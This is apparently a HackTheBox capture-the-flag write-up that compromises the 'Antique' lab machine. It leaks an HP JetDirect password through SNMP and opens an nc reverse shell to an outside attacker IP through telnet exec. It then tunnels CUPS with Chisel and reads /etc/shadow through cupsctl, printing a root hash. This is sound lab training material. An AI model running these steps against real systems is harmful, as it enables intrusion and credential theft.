---
title: Antique
tags:
  - HackTheBox
  - Easy
  - Linux
  - Printer_Hacking
  - Telnet
  - SNMP
  - Tunnelling
  - CUPS
date: 2024-09-23T00:00:00Z
---
![](Pasted%20image%2020241123232115.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.107 antique.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- antique.htb > sC.txt

[redacted]
PORT   STATE SERVICE
23/tcp open  telnet
```

So I connected via telnet to the machine, but unfortunately, it required password:

```shell
telnet antique.htb 23

[redacted]
Connected to antique.htb.
Escape character is '^]'.

HP JetDirect
```

Now we know that there is an HP JetDirect printer running.

So I decided to run another Nmap scan, but UDP this time (I just scanned top 10 ports because this type of scan is not very reliable):

```shell
nmap -sU --top-ports=10 antique.htb

[redacted]
PORT     STATE         SERVICE
53/udp   open|filtered domain
67/udp   closed        dhcps
123/udp  open|filtered ntp
135/udp  closed        msrpc
137/udp  closed        netbios-ns
138/udp  closed        netbios-dgm
161/udp  open          snmp
445/udp  closed        microsoft-ds
631/udp  closed        ipp
1434/udp open|filtered ms-sql-m
```

Then I performed a more detailed one on port `161`:

```shell
nmap -sUV -p161 antique.htb > 161.txt

[redacted]
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
```

## Weaponization

Apart from [Hacktricks notes](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp) I discovered this forum about [Network printer hacking](https://www.irongeek.com/i.php?page=security/networkprinterhacking)

## Exploitation

So I performed the following command to get the JetDirect password using the SNMP vulnerability:

```shell
snmpget -v 1 -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

We have to notice the BITS part and decode it from Hex (e.g. with Cyberchef):

```python
50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
# Decoded from hex
P@ssw0rd@123!!123"#%&'01345789BCIPQTWXaetuy 
# The password is just
P@ssw0rd@123!!123
```

> I got access :D

![](Pasted%20image%2020241123235442.png)

Now I executed the help command:

```shell
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```

I noticed this command:

```shell
exec: execute system commands (exec id)
# I tried to execute a command
exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

So I can try to get a reverse shell from here:

```shell
exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.25 666 >/tmp/f
```

> Got it!

![](Pasted%20image%2020241123235939.png)

I can now read the user flag:

![](Pasted%20image%2020241124000131.png)

## Privilege Escalation

I performed some enumeration around the machine, and discovered something running on port 631:

```shell
netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
tcp        0      0 10.10.11.107:23         10.10.14.25:56774       ESTABLISHED
tcp        0      2 10.10.11.107:46940      10.10.14.25:666         ESTABLISHED
tcp6       0      0 ::1:631                 :::*                    LISTEN 
```

If we perform a curl request, it returns a webpage:

```shell
curl 127.0.0.1:631

[redacted]
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Home - CUPS 1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
        <LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png">
</HEAD>
<BODY>
<TABLE CLASS="page" SUMMARY="{title}">
<TR><TD CLASS="body">
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0" SUMMARY="">
<TR HEIGHT="36">
[redacted]
```

Now, to perform the tunnelling I need to download [Chisel](https://github.com/jpillora/chisel) on my machine and upload it to the printer:

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gunzip chisel_1.10.1_linux_amd64.gz
# Now create a python server and upload it to the machine
```

Now on my machine I executed the following command:

```shell
./chisel_1.10.1_linux_amd64 server -p 7000 --reverse 
```

And then on the printer I run:

```shell
chmod +x chisel_1.10.1_linux_amd64
./chisel_1.10.1_linux_amd64 client 10.10.14.25:7000 R:7631:localhost:631
```

![](Pasted%20image%2020241124001852.png)

Now I can visit `http://localhost:7631` and see what the page looks like:

![](Pasted%20image%2020241124002023.png)

Searching for "*CUPS 1.6.1 exploit*" I dealed with [CUPS root file read exploit](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb). Although it's a Metasploit exploit, I decided to check for what was actually doing:

```ruby
cmd_exec("#{ctl_path} ErrorLog=#{datastore['FILE']}")
# Then check
file = strip_http_headers(get_request('/admin/log/error_log'))
```

Basically you can use `cupsctl` to send the content of any file to an error log, like:

```shell
cupsctl ErrorLog=/etc/shadow
# The check it using curl
curl -S http://localhost:631/admin/log/error_log

[redacted]
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
```

So we can now read any file in the system :D So I read root flag:

![](Pasted%20image%2020241124003125.png)

==Machine pwned!==